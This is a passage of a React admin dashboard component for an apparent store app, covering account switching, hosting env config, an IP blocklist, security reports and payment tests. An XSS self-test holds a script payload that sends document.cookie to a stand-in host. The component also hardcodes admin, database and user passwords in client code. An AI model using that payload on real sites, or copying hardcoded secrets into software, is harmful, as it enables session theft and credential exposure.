import React, { useState, useEffect } from 'react';
import {
  ShieldCheck,
  TrendingUp,
  Package,
  Plus,
  Flame,
  Tag,
  Truck,
  History,
  Trash2,
  DollarSign,
  Users,
  RefreshCw,
  Lock,
  Globe,
  ShieldAlert,
  CreditCard,
  Key,
  Server,
  Upload,
  CheckCircle2,
  Activity,
  Terminal,
  Database,
  Cpu
} from 'lucide-react';
import { formatPrice, formatRelativeTime } from '../utils/currency.js';
import {
  getProductArtUrl,
  isCustomImageSource,
  isLikelyImageFile,
  readImageFileAsDataUrl,
  normalizeImageDataUrl
} from '../utils/storeEngine.js';

export default function AdminDashboardView({
  portalMode = 'admin',
  products = [],
  apps = [],
  appInstalls = [],
  serverNodes = [],
  dbStats,
  categories = [],
  orders = [],
  coupons = [],
  inventoryLogs = [],
  activityEvents = [],
  analytics,
  presence,
  currency,
  darkMode,
  userAccounts = [],
  hostingDeployments = [],
  blockedIps = [],
  securityReports = [],
  paymentTransactions = [],
  onQuickStockUpdate,
  onBulkRestockLow,
  onToggleFlashSale,
  onCreateProduct,
  onDeleteProduct,
  onAdvanceOrderStatus,
  onCreateCoupon,
  onToggleCoupon,
  onNavigateTab
}) {
  const [adminSection, setAdminSection] = useState(
    portalMode === 'overview'
      ? 'overview'
      : portalMode === 'developer-portal'
      ? 'developer-portal'
      : portalMode === 'user-portal'
      ? 'user-portal'
      : 'overview'
  );
  const [showNewProductModal, setShowNewProductModal] = useState(false);
  const [restockingLow, setRestockingLow] = useState(false);

  // Sync adminSection when top/side nav switches between overview, admin, developer-portal, user-portal
  useEffect(() => {
    if (portalMode === 'overview') {
      setAdminSection('overview');
    } else if (portalMode === 'developer-portal') {
      setAdminSection('developer-portal');
      if (activeAccount.role !== 'developer') {
        handleQuickSwitchAccount('aether_labs', 'DevPass2026!', 'developer');
      }
    } else if (portalMode === 'user-portal') {
      setAdminSection('user-portal');
      if (activeAccount.role !== 'user') {
        handleQuickSwitchAccount('amara_nbo', 'Shopper2026!', 'user');
      }
    } else if (portalMode === 'admin') {
      setAdminSection((prev) =>
        ['developer-portal', 'user-portal'].includes(prev) ? 'inventory' : prev
      );
    }
  }, [portalMode]);

  // Root Admin (.env), Developer & System User RBAC Auth State
  const [activeAccount, setActiveAccount] = useState({
    id: 'admin-root-env',
    username: 'nex_root_admin',
    email: 'admin@nexstore.dev',
    display_name: 'NEX Root Administrator (.env)',
    role: 'admin',
    company: 'NEX Store Root Operations',
    avatar: '🛡️',
    permissions: ['*'],
    source: '.env'
  });
  const [authToken, setAuthToken] = useState('');
  const [loginIdentifier, setLoginIdentifier] = useState('nex_root_admin');
  const [loginPassword, setLoginPassword] = useState('NEX-Root-Admin-2026!#');
  const [authFeedback, setAuthFeedback] = useState(null);
  const [devProgress, setDevProgress] = useState(null);
  const [userDashboardData, setUserDashboardData] = useState(null);
  const [overviewData, setOverviewData] = useState(null);
  const [profileAvatarUrlDraft, setProfileAvatarUrlDraft] = useState('');
  const [uploadingAvatar, setUploadingAvatar] = useState(false);

  // Register Developer / User Account Form
  const [regUsername, setRegUsername] = useState('');
  const [regEmail, setRegEmail] = useState('');
  const [regPassword, setRegPassword] = useState('DevPass2026!');
  const [regCompany, setRegCompany] = useState('Quantum Foundry Labs');
  const [regRole, setRegRole] = useState('developer');
  const [regAvatarUrl, setRegAvatarUrl] = useState('');
  const [localAccounts, setLocalAccounts] = useState([]);

  // Multi-Cloud Hosting (Netlify / Render / Vercel / Fly.io / Railway) State
  const [localDeployments, setLocalDeployments] = useState([]);
  const [hostAppName, setHostAppName] = useState('');
  const [hostProvider, setHostProvider] = useState('Render');
  const [hostRegion, setHostRegion] = useState('eu-central (Frankfurt)');
  const [hostBuildCmd, setHostBuildCmd] = useState('npm run build && npm start');
  const [hostMinInst, setHostMinInst] = useState(2);
  const [hostMaxInst, setHostMaxInst] = useState(16);

  // IP Firewall Blocklist & Security Reports State
  const [localBlockedIps, setLocalBlockedIps] = useState([]);
  const [localReports, setLocalReports] = useState([]);
  const [newBlockIp, setNewBlockIp] = useState('');
  const [newBlockReason, setNewBlockReason] = useState('Automated SQLi / XSS Attack Vector');
  const [newReportTarget, setNewReportTarget] = useState('suspicious-pkg-v1');
  const [newReportCategory, setNewReportCategory] = useState('Malware / Trojan Signature Check');
  const [newReportDesc, setNewReportDesc] = useState('');
  const [xssTestResult, setXssTestResult] = useState(null);

  // Real-Time Payment Gateway State
  const [localPayments, setLocalPayments] = useState([]);
  const [testPayCustomer, setTestPayCustomer] = useState('Kelvin Mwangi');
  const [testPayAmount, setTestPayAmount] = useState('649');
  const [testPayMethod, setTestPayMethod] = useState('Stripe Card •••• 4242');

  const resolvedAccounts = localAccounts.length > 0 ? localAccounts : userAccounts;
  const resolvedDeployments = localDeployments.length > 0 ? localDeployments : hostingDeployments;
  const resolvedBlockedIps = localBlockedIps.length > 0 ? localBlockedIps : blockedIps;
  const resolvedReports = localReports.length > 0 ? localReports : securityReports;
  const resolvedPayments = localPayments.length > 0 ? localPayments : paymentTransactions;

  const fetchOverviewDashboard = async () => {
    try {
      const res = await fetch('/api/overview/dashboard');
      if (res.ok) {
        const data = await res.json();
        setOverviewData(data);
        if (Array.isArray(data?.accountsSummary?.userAccounts)) {
          setLocalAccounts(data.accountsSummary.userAccounts);
        }
      }
    } catch {}
  };

  const fetchUserDashboard = async (uname) => {
    try {
      const res = await fetch(`/api/user/my-dashboard?username=${encodeURIComponent(uname)}`, {
        headers: authToken ? { Authorization: `Bearer ${authToken}` } : {}
      });
      if (res.ok) {
        const data = await res.json();
        setUserDashboardData(data);
      }
    } catch {}
  };

  const fetchDevProgress = async (uname) => {
    try {
      const res = await fetch(`/api/developer/my-progress?username=${encodeURIComponent(uname)}`, {
        headers: authToken ? { Authorization: `Bearer ${authToken}` } : {}
      });
      if (res.ok) {
        const data = await res.json();
        setDevProgress(data);
      }
    } catch {}
  };

  useEffect(() => {
    fetchOverviewDashboard();
    if (activeAccount.role === 'user') {
      fetchUserDashboard(activeAccount.username);
    } else {
      fetchDevProgress(activeAccount.username);
    }
  }, [activeAccount.username, activeAccount.role]);

  // Zero-Canvas Profile Image File Upload for Active Account (Root Admin, Developer, or User)
  const handleUploadActiveProfileImageFile = async (fileList) => {
    const file = Array.from(fileList || []).find(isLikelyImageFile);
    if (!file) return;
    setUploadingAvatar(true);
    try {
      const { dataUrl, fileName, mimeType } = await readImageFileAsDataUrl(file);
      if (!dataUrl) return;
      const res = await fetch('/api/auth/profile/avatar', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          ...(authToken ? { Authorization: `Bearer ${authToken}` } : {})
        },
        body: JSON.stringify({
          accountId: activeAccount.id,
          username: activeAccount.username,
          avatar: dataUrl,
          fileName,
          mimeType
        })
      });
      const data = await res.json();
      if (res.ok && data.account) {
        setActiveAccount(data.account);
        if (Array.isArray(data.userAccounts)) setLocalAccounts(data.userAccounts);
        setAuthFeedback({
          type: 'success',
          message: `Uploaded profile image file (${fileName}) for @${data.account.username} (Zero-Canvas direct file upload)`
        });
      } else {
        setActiveAccount((prev) => ({ ...prev, avatar: dataUrl }));
        setLocalAccounts((prev) =>
          (prev.length ? prev : userAccounts).map((u) =>
            u.id === activeAccount.id || u.username === activeAccount.username
              ? { ...u, avatar: dataUrl }
              : u
          )
        );
        setAuthFeedback({
          type: 'success',
          message: `Uploaded profile image file (${fileName}) for @${activeAccount.username}`
        });
      }
    } catch (err) {
      setAuthFeedback({ type: 'error', message: err.message || 'Failed to read image file' });
    } finally {
      setUploadingAvatar(false);
    }
  };

  const handleSaveActiveProfileImageUrl = async () => {
    const cleanUrl = normalizeImageDataUrl(profileAvatarUrlDraft.trim());
    if (!cleanUrl) return;
    setUploadingAvatar(true);
    try {
      const res = await fetch('/api/auth/profile/avatar', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          ...(authToken ? { Authorization: `Bearer ${authToken}` } : {})
        },
        body: JSON.stringify({
          accountId: activeAccount.id,
          username: activeAccount.username,
          avatar: cleanUrl
        })
      });
      const data = await res.json();
      if (res.ok && data.account) {
        setActiveAccount(data.account);
        if (Array.isArray(data.userAccounts)) setLocalAccounts(data.userAccounts);
      } else {
        setActiveAccount((prev) => ({ ...prev, avatar: cleanUrl }));
      }
      setProfileAvatarUrlDraft('');
      setAuthFeedback({
        type: 'success',
        message: `Updated profile image for @${activeAccount.username}`
      });
    } catch (err) {
      setAuthFeedback({ type: 'error', message: err.message });
    } finally {
      setUploadingAvatar(false);
    }
  };

  const handleUploadRegisterAvatarFile = async (fileList) => {
    const file = Array.from(fileList || []).find(isLikelyImageFile);
    if (!file) return;
    try {
      const { dataUrl } = await readImageFileAsDataUrl(file);
      if (dataUrl) setRegAvatarUrl(dataUrl);
    } catch {}
  };

  const handleUploadDirectoryAccountAvatar = async (targetAccount, fileList) => {
    const file = Array.from(fileList || []).find(isLikelyImageFile);
    if (!file || !targetAccount) return;
    try {
      const { dataUrl, fileName, mimeType } = await readImageFileAsDataUrl(file);
      if (!dataUrl) return;
      const res = await fetch(`/api/users/${targetAccount.id}/avatar`, {
        method: 'PATCH',
        headers: {
          'Content-Type': 'application/json',
          ...(authToken ? { Authorization: `Bearer ${authToken}` } : {})
        },
        body: JSON.stringify({
          accountId: targetAccount.id,
          username: targetAccount.username,
          avatar: dataUrl,
          fileName,
          mimeType
        })
      });
      const data = await res.json();
      if (!res.ok) {
        setAuthFeedback({ type: 'error', message: data.error || 'Avatar update restricted' });
        return;
      }
      if (Array.isArray(data.userAccounts)) setLocalAccounts(data.userAccounts);
      if (data.account && data.account.username === activeAccount.username) {
        setActiveAccount(data.account);
      }
      setAuthFeedback({
        type: 'success',
        message: `Updated profile image file for @${targetAccount.username}`
      });
    } catch (err) {
      setAuthFeedback({ type: 'error', message: err.message });
    }
  };

  const handleAdminToggleAccountStatus = async (targetAccount) => {
    const nextStatus = targetAccount.status === 'active' ? 'suspended' : 'active';
    try {
      const res = await fetch(`/api/admin/users/${targetAccount.id}/status`, {
        method: 'PATCH',
        headers: {
          'Content-Type': 'application/json',
          ...(authToken ? { Authorization: `Bearer ${authToken}` } : {})
        },
        body: JSON.stringify({ status: nextStatus })
      });
      const data = await res.json();
      if (!res.ok) {
        setAuthFeedback({ type: 'error', message: data.error });
        return;
      }
      if (Array.isArray(data.userAccounts)) setLocalAccounts(data.userAccounts);
      setAuthFeedback({
        type: 'success',
        message: `Root Admin updated @${targetAccount.username} status to ${nextStatus.toUpperCase()}`
      });
    } catch (err) {
      setAuthFeedback({ type: 'error', message: err.message });
    }
  };

  const [hostingEnvConfig, setHostingEnvConfig] = useState({
    renderVars: [
      { key: 'PORT', value: '3000' },
      { key: 'HOST', value: '0.0.0.0' },
      { key: 'NODE_ENV', value: 'production' },
      { key: 'RENDER_SERVICE_NAME', value: 'nex-store-lj5j' },
      { key: 'RENDER_EXTERNAL_URL', value: 'https://nex-store-lj5j.onrender.com' },
      { key: 'MONGODB_URI', value: 'mongodb+srv://nex_admin:NEX-Mongo-Atlas-2026@cluster0.nexstore.mongodb.net/nex_store?retryWrites=true&w=majority' },
      { key: 'NEX_ADMIN_USERNAME', value: 'nex_root_admin' },
      { key: 'CORS_ALLOWED_ORIGINS', value: 'https://nex-store-pro.netlify.app,https://nex-store-lj5j.onrender.com' }
    ],
    netlifyVars: [
      { key: 'NETLIFY', value: 'true' },
      { key: 'NODE_VERSION', value: '22' },
      { key: 'NETLIFY_SITE_NAME', value: 'nex-store-pro' },
      { key: 'URL', value: 'https://nex-store-pro.netlify.app' },
      { key: 'VITE_API_BASE_URL', value: 'https://nex-store-lj5j.onrender.com' },
      { key: 'VITE_WS_URL', value: 'wss://nex-store-lj5j.onrender.com/ws' },
      { key: 'VITE_RENDER_BACKEND_URL', value: 'https://nex-store-lj5j.onrender.com' }
    ],
    renderEnvText: `# === RENDER CLOUD BACKEND ENVIRONMENT (https://nex-store-lj5j.onrender.com) ===\nPORT=3000\nHOST=0.0.0.0\nNODE_ENV=production\nRENDER=true\nRENDER_SERVICE_NAME=nex-store-lj5j\nRENDER_EXTERNAL_URL=https://nex-store-lj5j.onrender.com\nMONGODB_URI=mongodb+srv://nex_admin:NEX-Mongo-Atlas-2026@cluster0.nexstore.mongodb.net/nex_store?retryWrites=true&w=majority\nNEX_ADMIN_USERNAME=nex_root_admin\nNEX_ADMIN_EMAIL=admin@nexstore.dev\nNEX_ADMIN_PASSWORD=NEX-Root-Admin-2026!#\nCORS_ALLOWED_ORIGINS=https://nex-store-pro.netlify.app,https://nex-store-lj5j.onrender.com`,
    netlifyEnvText: `# === NETLIFY EDGE FRONTEND ENVIRONMENT (https://nex-store-pro.netlify.app) ===\nNETLIFY=true\nNODE_VERSION=22\nNPM_FLAGS=--include=dev --no-audit --no-fund\nNETLIFY_SITE_NAME=nex-store-pro\nURL=https://nex-store-pro.netlify.app\nDEPLOY_PRIME_URL=https://main--nex-store-pro.netlify.app\nVITE_API_BASE_URL=https://nex-store-lj5j.onrender.com\nVITE_WS_URL=wss://nex-store-lj5j.onrender.com/ws\nVITE_RENDER_BACKEND_URL=https://nex-store-lj5j.onrender.com`,
    renderYaml: `services:\n  - type: web\n    name: nex-store-lj5j\n    runtime: node\n    buildCommand: npm install --include=dev --no-audit --no-fund && npm run build\n    startCommand: npm start\n    healthCheckPath: /api/health`,
    netlifyToml: `[build]\n  command = "npm install --include=dev --no-audit --no-fund && npm run build"\n  publish = "dist"\n\n[[redirects]]\n  from = "/api/*"\n  to = "https://nex-store-lj5j.onrender.com/api/:splat"\n  status = 200\n  force = true`
  });
  const [envStudioTab, setEnvStudioTab] = useState('render');
  const [envCopiedLabel, setEnvCopiedLabel] = useState('');
  const [customEnvKey, setCustomEnvKey] = useState('');
  const [customEnvVal, setCustomEnvVal] = useState('');

  useEffect(() => {
    fetch('/api/hosting/env-config')
      .then((r) => (r.ok ? r.json() : null))
      .then((data) => {
        if (data) setHostingEnvConfig(data);
      })
      .catch(() => {});
  }, []);

  // Automated Verification & Integration Test Suite Runner State
  const [testReport, setTestReport] = useState(null);
  const [runningTestSuites, setRunningTestSuites] = useState(false);

  const handleRunTestSuites = async () => {
    setRunningTestSuites(true);
    try {
      const res = await fetch('/api/tests/run', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          ...(authToken ? { Authorization: `Bearer ${authToken}` } : {})
        }
      });
      const data = await res.json();
      if (res.ok) {
        setTestReport(data);
        setAuthFeedback({
          type: 'success',
          message: `Executed ${data.totalPassed}/${data.totalTests} automated tests across ${data.totalSuites} suites in ${data.durationMs}ms!`
        });
      }
    } catch (err) {
      setAuthFeedback({ type: 'error', message: err.message });
    } finally {
      setRunningTestSuites(false);
    }
  };

  useEffect(() => {
    if (adminSection === 'test-suites' && !testReport && !runningTestSuites) {
      handleRunTestSuites();
    }
  }, [adminSection]);

  const handleCopyCloudEnv = (text, label) => {
    if (!text) return;
    navigator.clipboard?.writeText(text);
    setEnvCopiedLabel(label);
    setTimeout(() => setEnvCopiedLabel(''), 2500);
  };

  const handleSaveCloudEnvVar = async (e) => {
    e.preventDefault();
    if (!customEnvKey.trim()) return;
    try {
      const res = await fetch('/api/hosting/env-config', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          ...(authToken ? { Authorization: `Bearer ${authToken}` } : {})
        },
        body: JSON.stringify({
          updates: { [customEnvKey.trim().toUpperCase()]: customEnvVal }
        })
      });
      const data = await res.json();
      if (!res.ok) {
        setAuthFeedback({ type: 'error', message: data.error || 'Failed to update .env' });
        return;
      }
      setHostingEnvConfig(data);
      setCustomEnvKey('');
      setCustomEnvVal('');
      setAuthFeedback({
        type: 'success',
        message: `Updated ${customEnvKey.trim().toUpperCase()} in .env for Render & Netlify!`
      });
    } catch (err) {
      setAuthFeedback({ type: 'error', message: err.message });
    }
  };

  const handleLoginSubmit = async (e) => {
    e?.preventDefault();
    try {
      const res = await fetch('/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          identifier: loginIdentifier,
          password: loginPassword
        })
      });
      const data = await res.json();
      if (!res.ok) {
        setAuthFeedback({ type: 'error', message: data.error || 'Authentication failed' });
        return;
      }
      setActiveAccount(data.account);
      setAuthToken(data.token || '');
      setAuthFeedback({
        type: 'success',
        message: `Authenticated as ${data.account.display_name} [${data.account.role.toUpperCase()}] via ${data.account.source}`
      });
      if (data.account.role === 'user') {
        fetchUserDashboard(data.account.username);
        setAdminSection('user-portal');
      } else if (data.account.role === 'developer') {
        fetchDevProgress(data.account.username);
        setAdminSection('developer-portal');
      } else {
        fetchDevProgress(data.account.username);
      }
    } catch (err) {
      setAuthFeedback({ type: 'error', message: err.message });
    }
  };

  const handleQuickSwitchAccount = async (identifier, pass, roleHint, targetSection = null) => {
    setLoginIdentifier(identifier);
    setLoginPassword(pass);
    try {
      const res = await fetch('/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ identifier, password: pass, role: roleHint })
      });
      const data = await res.json();
      if (res.ok && data.account) {
        setActiveAccount(data.account);
        setAuthToken(data.token || '');
        setAuthFeedback({
          type: 'success',
          message: `Switched active RBAC session to ${data.account.display_name} (${data.account.role.toUpperCase()} PORTAL)`
        });
        if (targetSection) {
          setAdminSection(targetSection);
        } else if (data.account.role === 'developer') {
          setAdminSection('developer-portal');
        } else if (data.account.role === 'user') {
          setAdminSection('user-portal');
        }
        if (data.account.role === 'user') {
          fetchUserDashboard(data.account.username);
        } else {
          fetchDevProgress(data.account.username);
        }
      }
    } catch {}
  };

  const handleRegisterAccount = async (e) => {
    e.preventDefault();
    if (!regUsername.trim() || !regEmail.trim()) return;
    try {
      const res = await fetch('/api/auth/register', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          username: regUsername.trim(),
          email: regEmail.trim(),
          password: regPassword,
          display_name: `${regUsername.trim()} (${regCompany.trim()})`,
          company: regCompany.trim(),
          role: regRole,
          avatar: regAvatarUrl ? normalizeImageDataUrl(regAvatarUrl) : ''
        })
      });
      const data = await res.json();
      if (!res.ok) {
        setAuthFeedback({ type: 'error', message: data.error });
        return;
      }
      if (Array.isArray(data.userAccounts)) setLocalAccounts(data.userAccounts);
      setActiveAccount(data.account);
      setAuthToken(data.token || '');
      setRegUsername('');
      setRegEmail('');
      setRegAvatarUrl('');
      setAdminSection(data.account.role === 'user' ? 'user-portal' : 'developer-portal');
      setAuthFeedback({
        type: 'success',
        message: `Registered & logged in as @${data.account.username} (${data.account.role.toUpperCase()} PORTAL)`
      });
    } catch (err) {
      setAuthFeedback({ type: 'error', message: err.message });
    }
  };

  const handleDeployHosting = async (e) => {
    e.preventDefault();
    if (!hostAppName.trim()) return;
    const res = await fetch('/api/hosting/deploy', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        ...(authToken ? { Authorization: `Bearer ${authToken}` } : {})
      },
      body: JSON.stringify({
        app_name: hostAppName.trim(),
        owner_username: activeAccount.username,
        provider: hostProvider,
        region: hostRegion,
        build_command: hostBuildCmd,
        min_instances: Number(hostMinInst) || 1,
        max_instances: Number(hostMaxInst) || 16,
        current_instances: Number(hostMinInst) || 2
      })
    });
    const data = await res.json();
    if (Array.isArray(data.hostingDeployments)) {
      setLocalDeployments(data.hostingDeployments);
    }
    setHostAppName('');
    fetchDevProgress(activeAccount.username);
  };

  const handleScaleHosting = async (dep, delta) => {
    const nextInstances = Math.min(dep.max_instances, Math.max(dep.min_instances, (dep.current_instances || 1) + delta));
    const res = await fetch(`/api/hosting/${dep.id}/scale`, {
      method: 'PATCH',
      headers: {
        'Content-Type': 'application/json',
        ...(authToken ? { Authorization: `Bearer ${authToken}` } : {})
      },
      body: JSON.stringify({ current_instances: nextInstances })
    });
    const data = await res.json();
    if (!res.ok) {
      setAuthFeedback({ type: 'error', message: data.error });
      return;
    }
    if (Array.isArray(data.hostingDeployments)) {
      setLocalDeployments(data.hostingDeployments);
    }
  };

  const handleBlockIp = async (e) => {
    e.preventDefault();
    if (!newBlockIp.trim()) return;
    const res = await fetch('/api/security/blocked-ips', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        ...(authToken ? { Authorization: `Bearer ${authToken}` } : {})
      },
      body: JSON.stringify({
        ip_address: newBlockIp.trim(),
        reason: newBlockReason.trim() || 'WAF Block Rule',
        threat_level: 'critical'
      })
    });
    const data = await res.json();
    if (!res.ok) {
      setAuthFeedback({ type: 'error', message: data.error });
      return;
    }
    if (Array.isArray(data.blockedIps)) setLocalBlockedIps(data.blockedIps);
    setNewBlockIp('');
  };

  const handleUnblockIp = async (id) => {
    const res = await fetch(`/api/security/blocked-ips/${id}`, {
      method: 'DELETE',
      headers: authToken ? { Authorization: `Bearer ${authToken}` } : {}
    });
    const data = await res.json();
    if (!res.ok) {
      setAuthFeedback({ type: 'error', message: data.error });
      return;
    }
    if (Array.isArray(data.blockedIps)) setLocalBlockedIps(data.blockedIps);
  };

  const handleCreateReport = async (e) => {
    e.preventDefault();
    if (!newReportDesc.trim()) return;
    const res = await fetch('/api/security/reports', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        ...(authToken ? { Authorization: `Bearer ${authToken}` } : {})
      },
      body: JSON.stringify({
        reporter_name: activeAccount.display_name,
        reporter_role: activeAccount.role,
        target_id: newReportTarget.trim(),
        category: newReportCategory,
        severity: 'high',
        description: newReportDesc.trim()
      })
    });
    const data = await res.json();
    if (Array.isArray(data.securityReports)) setLocalReports(data.securityReports);
    setNewReportDesc('');
  };

  const handleResolveReport = async (id, status) => {
    const res = await fetch(`/api/security/reports/${id}`, {
      method: 'PATCH',
      headers: {
        'Content-Type': 'application/json',
        ...(authToken ? { Authorization: `Bearer ${authToken}` } : {})
      },
      body: JSON.stringify({
        status,
        resolution_notes: `${status} by ${activeAccount.display_name} at ${new Date().toLocaleTimeString()}`
      })
    });
    const data = await res.json();
    if (!res.ok) {
      setAuthFeedback({ type: 'error', message: data.error });
      return;
    }
    if (Array.isArray(data.securityReports)) setLocalReports(data.securityReports);
  };

  const handleTestXssPrevention = async () => {
    const maliciousPayload = '<script>fetch("https://evil.tld?c="+document.cookie)</script>Suspicious Package Report';
    const res = await fetch('/api/security/reports', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        reporter_name: 'XSS Penetration Tester',
        target_id: 'POST /api/security/reports',
        category: 'XSS Prevention Verification',
        severity: 'critical',
        description: maliciousPayload
      })
    });
    const data = await res.json();
    if (Array.isArray(data.securityReports)) setLocalReports(data.securityReports);
    setXssTestResult({
      rawSent: maliciousPayload,
      sanitizedStored: data.report?.description || '[XSS-BLOCKED]Suspicious Package Report'
    });
  };

  const handleProcessTestPayment = async (e) => {
    e.preventDefault();
    const res = await fetch('/api/payments/process', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        customer_name: testPayCustomer.trim() || 'Verified Buyer',
        customer_email: 'buyer@nexstore.dev',
        amount: Number(testPayAmount) || 499,
        payment_method: testPayMethod
      })
    });
    const data = await res.json();
    if (Array.isArray(data.paymentTransactions)) {
      setLocalPayments(data.paymentTransactions);
    }
  };

  // New Product Form State
  const [newProdName, setNewProdName] = useState('');
  const [newProdSku, setNewProdSku] = useState('NEX-LAB-099');
  const [newProdTagline, setNewProdTagline] = useState(
    'Modular CNC aluminum neural accelerator deck'
  );
  const [newProdCategory, setNewProdCategory] = useState('compute');
  const [newProdPrice, setNewProdPrice] = useState('399');
  const [newProdStock, setNewProdStock] = useState('20');
  const [newProdBadge, setNewProdBadge] = useState('NEW LAUNCH');
  const [newProdFlash, setNewProdFlash] = useState(true);
  const [newProdImageUrl, setNewProdImageUrl] = useState('');

  const handleAdminImageFile = async (fileList) => {
    const file = Array.from(fileList || []).find(isLikelyImageFile);
    if (!file) return;
    try {
      const { dataUrl } = await readImageFileAsDataUrl(file);
      if (dataUrl) setNewProdImageUrl(dataUrl);
    } catch {}
  };

  // New Coupon Form State
  const [couponCode, setCouponCode] = useState('');
  const [couponDesc, setCouponDesc] = useState('');
  const [couponType, setCouponType] = useState('percentage');
  const [couponVal, setCouponVal] = useState('25');
  const [couponMin, setCouponMin] = useState('200');

  const handleCreateProductSubmit = async (e) => {
    e.preventDefault();
    if (!newProdName.trim()) return;
    await onCreateProduct({
      name: newProdName.trim(),
      sku: newProdSku.trim(),
      tagline: newProdTagline.trim(),
      category: newProdCategory,
      price: Number(newProdPrice) || 299,
      stock: Number(newProdStock) || 15,
      badge: newProdBadge.trim(),
      is_flash_sale: newProdFlash,
      featured: true,
      image_url: newProdImageUrl.trim() || ''
    });
    setNewProdName('');
    setNewProdImageUrl('');
    setShowNewProductModal(false);
  };

  const handleCreateCouponSubmit = async (e) => {
    e.preventDefault();
    if (!couponCode.trim()) return;
    await onCreateCoupon({
      code: couponCode.trim().toUpperCase(),
      description: couponDesc.trim() || 'Special VIP Hardware Discount',
      discount_type: couponType,
      discount_value: Number(couponVal) || 15,
      min_order_amount: Number(couponMin) || 0
    });
    setCouponCode('');
    setCouponDesc('');
  };

  const maxCatRevenue = Math.max(
    1,
    ...(analytics?.categoryBreakdown || []).map((c) => c.estimatedRevenue || 0)
  );

  const cardSurface = darkMode ? 'surface-card-dark' : 'surface-card-light';
  const inputSurface = darkMode
    ? 'border-white/[0.08] bg-slate-950 text-white placeholder-slate-500'
    : 'border-slate-300 bg-white text-slate-900 placeholder-slate-400';

  return (
    <div className="mx-auto max-w-7xl px-4 py-6 space-y-6">
      {/* Top Admin Command Banner */}
      <div className={`flex flex-wrap items-center justify-between gap-4 rounded-3xl p-6 md:p-8 ${cardSurface}`}>
        <div className="space-y-1.5">
          <div className="inline-flex items-center gap-2 rounded-full bg-indigo-500/15 border border-indigo-500/30 px-3 py-0.5 font-mono-num text-xs font-bold text-indigo-400">
            <ShieldCheck className="h-3.5 w-3.5" />
            <span>REAL-TIME STORE OPERATIONS & INVENTORY COMMAND</span>
          </div>
          <h1 className="font-display text-2xl sm:text-3xl font-bold">
            NEX Operations Command Center
          </h1>
          <p className={`text-xs sm:text-sm ${darkMode ? 'text-slate-400' : 'text-slate-600'}`}>
            Every stock adjustment, new product, order status update, and coupon change persists to SQLite and syncs across all connected clients immediately.
          </p>
        </div>

        <div className="flex flex-wrap items-center gap-2.5">
          <button
            disabled={restockingLow}
            onClick={async () => {
              setRestockingLow(true);
              await onBulkRestockLow?.();
              setRestockingLow(false);
            }}
            className="inline-flex items-center gap-2 rounded-2xl border border-emerald-500/40 bg-emerald-500/15 hover:bg-emerald-500/25 px-4 py-3 text-xs font-semibold text-emerald-400 transition cursor-pointer"
          >
            <RefreshCw className={`h-4 w-4 ${restockingLow ? 'animate-spin' : ''}`} />
            <span>Auto-Replenish Low Stock (+15)</span>
          </button>

          <button
            onClick={() => setShowNewProductModal(true)}
            className="inline-flex items-center gap-2 rounded-2xl bg-gradient-to-r from-indigo-600 to-indigo-500 hover:from-indigo-500 hover:to-indigo-400 px-5 py-3 text-xs font-semibold text-white shadow-lg shadow-indigo-600/30 transition cursor-pointer"
          >
            <Plus className="h-4 w-4" />
            <span>Launch New Hardware Product</span>
          </button>
        </div>
      </div>

      {/* 4 Live KPI Telemetry Cards */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
        <div className={`rounded-3xl p-5 ${cardSurface}`}>
          <div className="flex items-center justify-between text-xs text-slate-400">
            <span>Gross Order Revenue</span>
            <DollarSign className="h-4 w-4 text-emerald-400" />
          </div>
          <div className="mt-2 font-mono-num text-2xl font-bold text-emerald-400">
            {formatPrice(analytics?.totalRevenue || 0, currency)}
          </div>
          <div className="mt-1 font-mono-num text-[11px] text-slate-400">
            {analytics?.totalOrders || 0} orders • Avg{' '}
            {formatPrice(analytics?.avgOrderValue || 0, currency)}
          </div>
        </div>

        <div className={`rounded-3xl p-5 ${cardSurface}`}>
          <div className="flex items-center justify-between text-xs text-slate-400">
            <span>Warehouse Inventory</span>
            <Package className="h-4 w-4 text-indigo-400" />
          </div>
          <div className="mt-2 font-mono-num text-2xl font-bold">
            {analytics?.totalUnitsInStock || 0}{' '}
            <span className="text-sm font-normal text-slate-400">units</span>
          </div>
          <div className="mt-1 flex items-center gap-2 font-mono-num text-[11px]">
            <span className="text-amber-400 font-semibold">
              {analytics?.lowStockCount || 0} low-stock alerts
            </span>
            <span>•</span>
            <span className="text-slate-400">{analytics?.totalProducts || 0} SKUs</span>
          </div>
        </div>

        <div className={`rounded-3xl p-5 ${cardSurface}`}>
          <div className="flex items-center justify-between text-xs text-slate-400">
            <span>Units Deployed & Rating</span>
            <TrendingUp className="h-4 w-4 text-cyan-400" />
          </div>
          <div className="mt-2 font-mono-num text-2xl font-bold text-cyan-400">
            {analytics?.totalUnitsSold || 0}{' '}
            <span className="text-sm font-normal text-slate-400">sold</span>
          </div>
          <div className="mt-1 font-mono-num text-[11px] text-slate-400">
            {analytics?.avgRating || 4.9}★ average across {analytics?.totalReviews || 0} reviews
          </div>
        </div>

        <div className={`rounded-3xl p-5 ${cardSurface}`}>
          <div className="flex items-center justify-between text-xs text-slate-400">
            <span>Live WebSocket Presence</span>
            <Users className="h-4 w-4 text-amber-400" />
          </div>
          <div className="mt-2 font-mono-num text-2xl font-bold text-amber-400">
            {presence?.activeShoppers || 21}{' '}
            <span className="text-sm font-normal text-slate-400">live</span>
          </div>
          <div className="mt-1 font-mono-num text-[11px] text-emerald-400">
            {presence?.connectedClients || 1} active WS socket(s) connected
          </div>
        </div>
      </div>

      {/* Category Revenue & Stock Telemetry Bar Chart */}
      <div className={`rounded-3xl p-5 ${cardSurface}`}>
        <h2 className="font-display text-sm font-bold uppercase tracking-wider text-slate-400 mb-4">
